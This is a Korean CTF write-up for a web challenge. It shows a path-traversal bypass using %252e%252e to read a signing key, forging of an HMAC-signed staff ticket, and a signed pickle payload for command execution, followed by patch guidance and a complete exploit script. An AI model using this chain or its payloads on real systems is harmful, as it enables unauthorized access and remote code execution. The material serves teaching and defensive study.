# hard-06 — 초대권 풀이

## 1. 문제 개요

| 항목 | 내용 |
|---|---|
| 분류 | Web / 경로 조작 → 서명 위조 → 역직렬화(pickle) 명령 실행 |
| 난이도 | Hard |
| 접속 | `http://<출제조IP>:8010` |
| 시작 | 회원가입 후 로그인하면 신청자 초대권(쿠키 `gh_8010_ticket`)을 받는다 |
| 플래그 위치 | 서버의 `vault/flag-<무작위>.txt` |

**최종 목표:** 서버 "금고"(`vault/`)에 있는 파일을 읽는다. 웹 화면 어디에도 금고를 여는 기능은 없으므로 서버에서 명령을 실행해야 한다.

최종 경로: **업로드 경로 조작으로 서명 키 읽기 → staff 초대권 위조로 운영진 포털 진입 → 체크인 화면에 옛 형식(pickle) 초대권을 넣어 명령 실행.**

---

## 2. 의도한 풀이 과정 (요약)

1. 로그인하면 `gh_8010_ticket` 쿠키를 받는다. `.` 앞부분을 base64 로 풀면 `{"tid":..,"name":..,"role":"guest"}` 이다. 운영진 포털은 이 쿠키의 `role` 이 `staff` 인지만 본다.
2. 뒷부분은 HMAC 서명이라 키 없이는 고칠 수 없다. 키는 `keys/ticket_key.json` 에 있다.
3. `/uploads/<이름>` 의 `..` 검사를 두 번 인코딩(`%252e%252e`)으로 우회해 키 파일을 읽는다.
4. 키로 `role: staff` 초대권을 직접 서명해 쿠키에 넣고 `/admin` 에 들어간다.
5. `/admin/checkin` 은 `v1.` 으로 시작하는 옛 초대권을 `pickle.loads` 로 연다. 서명만 맞으면 되므로, 명령을 실행하는 pickle 을 같은 키로 서명해 폼으로 보낸다.
6. 실행 결과가 "○○님 입장 확인" 자리에 찍힌다. `cat vault/*` 로 플래그를 읽는다.

---

## 3. 초기 분석과 단서

- 문제 설명: "초대권은 절대 위조할 수 없다", "금고에 넣어 둔 것은 운영진조차 꺼내 볼 수 없다". 위조와 금고, 두 단계가 있다는 뜻이다.
- `ticket.py`: 초대권은 `base64(JSON) + "." + HMAC-SHA256(secret, body)`. 키는 `keys/ticket_key.json` 에서 읽는다. zip 에는 `keys/ticket_key.example.json` 만 있어서 파일 위치와 모양을 알 수 있다.
- `routes/admin.py` 의 `require_admin()`: 세션이 아니라 초대권 쿠키의 `role` 만 본다.
- `ticket.py` 의 `read_legacy()`: `v1.` 옛 초대권은 서명 확인 뒤 `pickle.loads` 로 연다. `verify()` 는 `v1.` 을 거부하므로 옛 초대권은 쿠키로는 못 쓰고 체크인 폼에만 쓸 수 있다.
- `routes/files.py`: 업로드 파일을 이름으로 내려준다. 이름 검사 뒤에 `unquote` 를 한 번 더 한다.

---

## 4. 취약점의 원인과 성립 조건

### 4-1. 경로 조작 — `routes/files.py`

```python
@bp.get("/uploads/<path:name>")
def uploaded(name):
    if name.startswith("/") or ".." in name:          # (A) 검사
        abort(400)
    path = os.path.join(UPLOAD_DIR, unquote(name))   # (B) 검사 뒤에 한 번 더 푼다
```

- **원인:** 검사(A)는 Flask 가 한 번 푼 값에 하고, 실제 경로는 한 번 더 푼 값(B)으로 만든다.
- `%252e%252e` → Flask 가 풀면 `%2e%2e` (검사 통과) → `unquote` 하면 `..`
- `/uploads/%252e%252e/keys/ticket_key.json` → `uploads/../keys/ticket_key.json`

### 4-2. 서명 위조 — `routes/admin.py`

```python
def require_admin():
    claims = ticket.verify(request.cookies.get(ticket.COOKIE_NAME))
    ...
    if claims.get("role") != "staff":
```

- **원인:** 서명 하나에만 의존하는데 그 키가 4-1 로 새어 나간다. 키를 알면 `role` 을 마음대로 바꾼 초대권을 만들 수 있다.

### 4-3. pickle 명령 실행 — `ticket.py`, `routes/admin.py`

```python
def read_legacy(token):
    body = _split(token[len(LEGACY_PREFIX):])   # 서명 확인
    ...
    return pickle.loads(_b64decode(body))       # 서명만 맞으면 무엇이든 연다
```

```python
            if token.startswith(ticket.LEGACY_PREFIX):
                guest = ticket.read_legacy(token)
            ...
            result = guest.get("name") if isinstance(guest, dict) else guest   # 결과를 화면에 그대로
```

- **원인:** `pickle.loads` 는 데이터를 여는 과정에서 객체의 `__reduce__` 가 돌려준 함수를 실행한다. 서명이 "누가 만들었는지"만 보장하는데, 키가 새면 그 보장도 사라진다.
- **성립 조건:** 서명 키(4-1), staff 초대권(4-2), 체크인 폼의 `ticket` 칸으로 보내기(쿠키로 보내면 `verify()` 가 거부).
- `__reduce__` 가 `(subprocess.check_output, (["sh", "-c", "cat vault/*"],))` 를 돌려주면 명령 결과(bytes)가 `result` 로 화면에 찍힌다.

---

## 5. 풀이 결과

- **성공 기준:** `/admin/checkin` 결과 자리에 `b'GlassHouse{...}\n'님 입장 확인` 이 보인다.
- 금고 안 파일 이름은 무작위라 `ls vault` 로 먼저 봐도 되고, `cat vault/*` 로 한 번에 읽어도 된다.

```bash
$ python3 exploit.py http://127.0.0.1:8010
[*] 서명 키 획득
[*] /admin: 200
[+] FLAG: GlassHouse{...}
```

---

## 6. 패치 방안과 검증

| 단계 | 패치 |
|---|---|
| 4-1 | 다 푼 최종 경로로 검사한다. `send_from_directory(UPLOAD_DIR, name)` 를 쓰거나, `os.path.realpath` 가 `UPLOAD_DIR` 안인지 확인한다. 키 파일은 웹 폴더 밖에 둔다 |
| 4-2 | 운영진 권한은 서버 쪽 세션과 계정의 role 로 판단한다. 클라이언트가 들고 다니는 값만 믿지 않는다 |
| 4-3 | 옛 형식 지원을 없애고 `pickle.loads` 를 쓰지 않는다. 옛 초대권도 JSON 으로만 읽는다 |

세 단계 중 하나만 막혀도 풀이 경로가 끊기지만, 각각 따로 위험하므로 모두 고친다.

**검증**
- 4-1: `/uploads/%252e%252e/keys/ticket_key.json` → 400 또는 404.
- 4-3: 같은 v1 초대권을 넣으면 "확인할 수 없는 초대권입니다" 가 나오고 명령이 실행되지 않는다.

---

## 7. 익스플로잇 코드

같은 폴더의 [exploit.py](exploit.py) 와 같습니다.

```python
#!/usr/bin/env python3
# hard-06 (초대권) - 키 파일 읽기 -> staff 초대권 위조 -> 옛 초대권(pickle)으로 명령 실행 -> 금고 읽기
# 사용: python3 exploit.py http://<IP>:8010
import base64
import hashlib
import hmac
import json
import pickle
import re
import subprocess
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8010"
COOKIE = "gh_8010_ticket"


def b64(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def sign(secret, body):
    return hmac.new(secret, body.encode(), hashlib.sha256).hexdigest()


# 1) /uploads 의 ".." 검사는 한 번 풀린 주소에만 걸린다. 두 번 인코딩해서 키 파일을 읽는다
#    %252e -> (Flask) %2e -> 검사 통과 -> (unquote) .
r = requests.get(f"{BASE}/uploads/%252e%252e/keys/ticket_key.json")
secret = r.json()["secret"].encode()
print("[*] 서명 키 획득")

# 2) role 을 staff 로 바꾼 초대권을 직접 서명해 쿠키로 넣는다
body = b64(json.dumps({"tid": 1, "name": "staff", "role": "staff"},
                      separators=(",", ":")).encode())
staff = {COOKIE: body + "." + sign(secret, body)}
print("[*] /admin:", requests.get(f"{BASE}/admin", cookies=staff).status_code)


# 3) 체크인 화면은 v1. 으로 시작하는 옛 초대권을 pickle 로 연다.
#    서명만 맞으면 되므로, 명령을 실행하는 객체를 pickle 로 만들어 같은 키로 서명한다
class Cmd:
    def __reduce__(self):
        return (subprocess.check_output, (["sh", "-c", "cat vault/*"],))


legacy_body = b64(pickle.dumps(Cmd()))
legacy = "v1." + legacy_body + "." + sign(secret, legacy_body)

# 4) 옛 초대권은 쿠키가 아니라 체크인 폼의 ticket 칸으로 보낸다. 결과가 화면에 찍힌다
r = requests.post(f"{BASE}/admin/checkin", cookies=staff, data={"ticket": legacy})
flag = re.search(r"GlassHouse\{[^}]*\}", r.text)
print(f"[+] FLAG: {flag.group(0)}" if flag else "[-] 실패")
```
